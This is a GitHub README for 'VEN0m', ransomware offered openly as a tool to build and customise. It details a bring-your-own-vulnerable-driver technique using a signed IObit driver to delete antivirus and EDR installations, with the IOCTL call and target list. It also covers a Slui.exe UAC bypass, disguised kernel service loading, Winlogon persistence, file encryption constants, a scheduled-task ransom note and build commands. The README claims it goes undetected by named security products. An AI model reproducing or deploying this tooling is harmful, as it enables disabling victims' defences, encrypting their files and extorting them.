
# VEN0m Ransomware 






https://github.com/user-attachments/assets/5a1fc9b5-a647-41f6-a152-7b9d97381adc












This project demonstartes how a legit, and signed driver can be weponized to evade defenses and deploy ransomware simulating a real cyberattack.


> 🚨 Tested on Windows 11 Pro 24H2. Fully undetectable as of the initial release date: 02-23-2026.
> 
>  
>|             | Evasion | UAC Bypass |
>|-------------|---------|------------|
>| BitDefender |   ✅    |     ✅    |
>| Kaspersky   |   ✅    |     ✅    |
>| MS Defender |   ✅    |     ❌    |

#
## Key Features

### AV/EDR Evasion:
VEN0m employs the classic BYOVD technique, but unlike the [AV-EDR-KILLER](https://github.com/xM0kht4r/AV-EDR-Killer), which exploits a vulnerable driver that exposes the kernel function `ZwTerminateProcess` to unprivileged users, it leverages a vulnerable driver included in  `IObit Malware Fighter v12.1.0` which is kinda ironic since we are using it for evasion.

The driver in question here is `IMFForceDelete.sys`, which exposes an IOCTL that allows unprivileged users to arbitrary delete files. This vulnerability is tracked as `CVE-2025-26125`, and the driver is still not on Microsoft’s blocklist.

To trigger arbitrary deletion, we simply invoke a DeviceIoControl API call with IOCTL code 0x8016E000, a long void pointer to a wide unicode string representing the target file and the total length multiplied by 2 (since wstr_file.len() gives the number of u16 elements and each element is 2 bytes) casted as u32 to fit the APIC calling convention's DWORD parameter.
```
> DeviceIoControl(hDriver, 0x8016E000, wstr_file.as_ptr() as LPVOID, (wstr_file.len() * 2) as u32, ptr::null_mut(), 0, &mut bytes_returned, ptr::null_mut())
```


>  [!NOTE]
> #### + ❓ Why did [AV-EDR-Killer](https://github.com/xM0kht4r/AV-EDR-Killer) fail against certain AV/EDR products?
> The main idea behind it was to exploit a driver that has unprotected IOCTLs exposing the kernel function `ZwTerminateProcess`, which grants any usermode application kernel-level termination capabilities. The weakness of this technique is that some AV/EDR products hook the said function and can intercept calls to it.
>
> Another notable technique was exploiting arbitrary read/write primitives of a certain vulnerable driver to patch memory and jump to an even more powerfull termination function, `PsTerminateProcess`, which is not exported by `ntoskrnl.exe` itself. This is also very suspicious since host defenses are constantly scanning the memory.
> Reference : https://securelist.com/av-killer-exploiting-throttlestop-sys/117026/


#### + What's new?
We simply shred the installation folders and the executables on disk. As simple as that!

This seems like a blind spot for most defense products, since we are targeting files on disk instead of manipulating the memory or making suspicious calls. Using our IMFForceDelete.sys driver, we can force delete locked files with high privileges. Directly attacking an AV or EDR product sounds counterintuitive, as attackers typically aim for stealth to bypass defenses rather than confront them.

By using this technique, we corrupted the running EDR/AV processes until they were slowly broken and stopped working properly, which opened the gateway to wreak havoc and deploy our payload of choice, VEN0m.

+ You can expand or adjust the list of target AV/EDR by modifying the constant **TARGETS**:
  
```
const TARGETS: &[&str] = &[r"C:\Program Files (x86)\Kaspersky Lab", r"C:\Program Files\Bitdefender", r"C:\Program Files\Bitdefender Agent", r"C:\Program Files\Windows Defender",];
```
#
### UAC Bypass:

To bypass UAC prompts, we are hijacking the execution flow of a signed Microsoft binary `Slui.exe` that supports auto-elevation without triggering a prompt when invoked with the `runas` verb under an administrative context.

The core exploitation occurs when `Slui.exe` attempts to open a non-existent registry key under `HKCU\Software\Classes\Launcher.SystemSettings\Shell\Open\Command`. We piggyback on this flaw by creating the missing key and inserting `DelegateExecute` pointing to our current payload in order to delegate the execution. We then trigger the execution of `Slui.exe` with a `ShellExecuteW` API call  with the `runas` verb, resulting in a successful UAC bypass. Full implementation can be found at `/src/uac.rs`.
> [!IMPORTANT]
I'm not sure if this is a vulnerability that should be reported. If so, please don't hesitate to contact me via the email listed below.

#
### Driver loading:

Since VEN0m is bypassing UAC and running in High integrity, it automates the extraction of the embedded driver into the temp folder and the creation of a kernel service with disguised names such as `MicrosoftUpdate11.01`. It includes very handy checks to autostart the service if stopped or to abstain from creating it if it already exists.

#
### Persistence:

After the host defenses are neutralized, you can choose whatever persistence technique you want. 
I went with a simple `Winlogon Userinit` technique, which leverages the `Userinit` registry key under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`. By default, this key specifies `userinit.exe` as the value, which executes upon user login to initialize the user environment. 
However, we hijack that by appending our payload path as well separated by a comma from the legitimate `userinit.exe`,  while also dropping a copy of the malware in `%LOCALAPPDATA%`.

#
### Encryption:
The ransomware scans specified drives for files with targeted extensions while filtering against an exclusion list. Matching files are encrypted using a 32-byte hardcoded key, and their extensions are changed to `.vnm`.

You can customize the behavior by modifying the following constants: 

+ **KEY** to specify the encryption key:
```
const KEY: &[u8; 32] = b"G7m9Xq2vR4pL8bF1sW0cZ6kD3jN5yH8u";
```
 
+ **XClUSIONS** to specify excluded directories and folders:
```
const XClUSIONS: &[&str] = &["Windows", "Program Files", "Program Files (x86)", "ProgramData", "$Recycle.Bin", "All Users"];
```
+ **XTENSIONS** to expand or adjust the list of target extensions:
```
const XTENSIONS: &[&str] = &["pdf", "doc", "xlms", "png", "jpg", "jpeg", "txt", "mp4"];
```
+ **DRV** to specify the target drives:
```
const DRV: &[&str] = &["C:\\", "D:\\", "E:\\", "F:\\"];
```

#
### Ransom Note:

Upon finishing encryption, VEN0m changes the desktop wallpaper and drops an executable ransom note onto the desktop. It also registers a scheduled task that runs every couple of minutes to launch the note GUI, which displays a flashy skull ☠️.

+ You can customize the wallpaper by replacing `/assets/wallpaper.jpg` with your own image.
+ You can modify the scheduled task properties by editing `/src/task.rs`
  
#
### Decyrption tool:

VEN0m also includes a decryptor tool `Antid0te.exe`🧪 that scans for files with the extension `.vnm` and reverses the encryption routine using the same key specified for encryption.

> [!WARNING]
It's important to save your encryption key so you can decrypt your files using the Antid0te.exe decryptor.

## Customization :
VEN0m is highly modular and customizable. You can change the behavior of the ransomware by modifying the hardcoded constants. You can also take it to the next level by pairing it with a privilege escalation vulnerability or a lateral movement technique of your choice :)

#
## Usage:

1. Place your .ico icons and your custom wallpaper inside /assets
2. Compile the binaries:
```
> cargo build --release --bin Note --features 1
> cargo build --release --bin Antid0te --features 2
> cargo build --release --bin VEN0m

```
#
## 🔒 DISCLAIMER
> [!CAUTION]
>You are responsible for ensuring you have proper authorization before using this tool. The author assumes no liability for misuse.


## 🤝 Collaborations
Contributions and suggestions are welcome! If you have "ethical" business inquiries or would like to collaborate, feel free to reach out at: M0kht4rHacks@protonmail.com


#
<p align="center">
Made with ❤️, inspired by Petya, WannaCry and co.
<p align="center">
VEN0m is a black stray cat that influenced me in my journey. 
</p>
